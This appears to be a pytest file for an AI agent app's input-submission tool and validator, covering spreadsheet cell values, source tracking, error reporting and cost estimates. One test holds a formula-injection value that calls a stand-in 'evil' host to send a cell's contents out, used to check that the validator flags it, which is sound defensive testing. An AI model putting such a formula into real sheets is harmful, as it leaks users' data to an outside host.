"""submit_inputs + validator: plain code around the agent (no AI, no network)."""

import json
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "agent_app"))

import agent  # noqa: E402

CELL = {"cell": "B3", "value": "3302 S ORCAS ST", "status": "record", "source_url": "https://x", "note": ""}


def submit_tool(run):
    return next(t for t in agent.make_tools(run) if t.name == "submit_inputs")


def submit(run, items):
    return json.loads(submit_tool(run).call({"items": items}))


def test_accepts_a_list_and_reports_cells_not_sent():
    out = submit(agent.Run(), [CELL])
    assert out["received"] == 1
    assert "B7" in out["cells_not_sent"] and "B3" not in out["cells_not_sent"]


def test_accepts_the_list_sent_as_json_text():
    run = agent.Run()
    assert submit(run, json.dumps([CELL]))["received"] == 1
    assert run.submitted[0]["cell"] == "B3"


def test_rejects_garbage_with_a_message_the_agent_can_act_on():
    run = agent.Run()
    assert "error" in submit(run, "not json")
    assert not run.submitted


def test_runs_do_not_share_state():
    first, second = agent.Run(), agent.Run()
    submit(first, [CELL])
    first.seen_sources.add("https://x")
    assert not second.submitted and not second.seen_sources


def test_validator_flags_unknown_sources_and_skipped_cells():
    final = agent.Run().validate([CELL])
    b3 = next(i for i in final if i["cell"] == "B3")
    assert b3["status"] == "check"  # https://x was never returned by a tool
    skipped = [i for i in final if i["cell"] != "B3"]
    assert len(skipped) == len(agent.REQUIRED_CELLS) - 1
    assert all(i["status"] == "missing" for i in skipped)


def test_validator_keeps_values_with_a_real_source():
    run = agent.Run(seen_sources={"https://x"})
    b3 = next(i for i in run.validate([CELL]) if i["cell"] == "B3")
    assert b3["status"] == "record"


def test_validator_drops_cells_outside_the_agreed_inputs_and_duplicates():
    run = agent.Run(seen_sources={"https://x"})
    final = run.validate([CELL, {**CELL, "value": "other"}, {**CELL, "cell": "B8"}, {**CELL, "cell": "Outputs!A1"}])
    assert [i["value"] for i in final if i["cell"] == "B3"] == ["3302 S ORCAS ST"]
    assert {i["cell"] for i in final} == set(agent.REQUIRED_CELLS)


def test_every_kind_of_source_link_from_a_tool_counts():
    run = agent.Run()
    run.collect_sources({"narrow_strips": [{"source_url": "https://row", "surface_source_url": "https://surf"}]})
    assert {"https://row", "https://surf"} <= run.seen_sources


def test_a_failing_tool_is_reported_to_the_agent_not_raised():
    def boom(_):
        raise RuntimeError("county site down")
    out = json.loads(agent.Run(log=lambda _: None).call("x", boom, "1"))
    assert "county site down" in out["error"]


def test_cost_estimate():
    assert agent.run_cost_usd(30_000, 3_500) == 0.19


def test_validator_flags_values_a_sheet_would_run_as_formulas():
    run = agent.Run(seen_sources={"https://x"})
    bad = {**CELL, "value": '=IMPORTDATA("https://evil/?"&B4)'}
    b3 = next(i for i in run.validate([bad]) if i["cell"] == "B3")
    assert b3["status"] == "check" and "formula" in b3["note"]


def test_validator_turns_unknown_statuses_into_check():
    run = agent.Run(seen_sources={"https://x"})
    b3 = next(i for i in run.validate([{**CELL, "status": "ok"}]) if i["cell"] == "B3")
    assert b3["status"] == "check"
